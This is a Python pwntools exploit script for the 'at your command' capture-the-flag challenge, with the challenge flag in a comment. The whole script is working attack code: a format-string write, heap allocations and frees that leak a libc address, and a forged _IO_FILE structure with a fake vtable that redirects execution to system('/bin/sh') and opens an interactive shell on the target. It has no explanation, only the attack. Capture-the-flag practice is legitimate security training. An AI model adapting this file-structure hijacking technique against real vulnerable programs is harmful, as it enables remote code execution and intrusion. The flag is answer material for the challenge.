#exploit for at your command
#flag=CTF-BR{_wh4t_4_fUn_xpl_ch41n_mY_c0mm4nd3r_}
from pwn import *
target=remote('command.pwn2.win',1337)
envi={"LD_PRELOAD":"./libc-2.27.so"}
#target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./command'],env=envi)
libc=ELF('./libc-2.27.so')
elf=ELF('./command')
context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript='''pie breakpoint *(0x1507-0x203000) ''')
#gdb.attach(target)

target.sendline("%*18$c%4$n")
def include_command(priority,cmd):
	print(target.recvuntil("> "))
	target.sendline("1")
	print(target.recvuntil("ity: "))
	target.sendline(str(priority))
	print(target.recvuntil("Command: "))
	target.send(cmd)
	print(target.recvline())
def review_command(index):
	print(target.recvuntil("> "))
	target.sendline("2")
	print(target.recvuntil("index: "))
	target.sendline(str(index))
	print(target.recvuntil("ity: "))
	priority=target.recvline().strip("\n")
	print(priority)
	print(target.recvuntil("Command: "))
	cmd=target.recvline().strip("\n")
	print(cmd)
	return cmd

def delete_command(index):
	print(target.recvuntil("> "))
	target.sendline("3")
	print(target.recvuntil("index: "))
	target.sendline(str(index))
	print(target.recvline())

def send_command():
	print(target.recvuntil("> "))
	target.sendline("5")

def pack_file(_IO_read_ptr = 0,
		_IO_read_end = 0,
		_IO_read_base = 0,
		_IO_write_base = 0,
		_IO_write_ptr = 0,
		_IO_write_end = 0,
		_IO_buf_base = 0,
		_IO_buf_end = 0,
		_IO_save_base = 0,
		_IO_backup_base = 0,
		_IO_save_end = 0,
		_IO_marker = 0,
		_IO_chain = 0,
		_fileno = 0,
		_lock = 0):
	struct = p64(_IO_read_ptr) + \
		 p64(_IO_read_end) + \
			p64(_IO_read_base) + \
			       p64(_IO_write_base) + \
			       p64(_IO_write_ptr) + \
			       p64(_IO_write_end) + \
			       p64(_IO_buf_base) + \
			       p64(_IO_buf_end) + \
			       p64(_IO_save_base) + \
			       p64(_IO_backup_base) + \
			       p64(_IO_save_end) + \
			       p64(_IO_marker) + \
			       p64(_IO_chain) + \
			       p32(_fileno)
	struct = struct.ljust(0x80, "\x00")
	struct += p64(_lock)
	struct = struct.ljust(0xd0, "\x00")
        return struct
for i in range(10):
        include_command(1,"A")

for i in range(9):
	delete_command(i)

for i in range(9):
	include_command(1,"A")

off=0x3ebc41
leak=review_command(8)
libc_leak=u64(leak+"\x00"*2)
libc_base=libc_leak-off
print(hex(libc_base))
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
libc_io_file_jumps=libc_base+libc.symbols["_IO_file_jumps"]
libc_io_str_overflow_ptr=libc_io_file_jumps+0xd8
libc_fake_vtable_addr=libc_io_str_overflow_ptr-0x10
libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]

for i in range(10):
	delete_command(i)


file_struct = pack_file(_IO_buf_base = 0,
			_IO_buf_end = (libc_binsh-100)/2,
			_IO_write_ptr = (libc_binsh-100)/2,
			_IO_write_base = 0,
			_lock = libc_malloc_hook-0x50)
# vtable pointer
file_struct += p64(libc_fake_vtable_addr)
# Next entry corresponds to: (*((_IO_strfile *) fp)->_s._allocate_buffer)
file_struct += p64(libc_system)
file_struct = file_struct.ljust(0x100,"\x00")
include_command(0,file_struct)
send_command()
target.sendline(str(0x1234))
target.interactive()
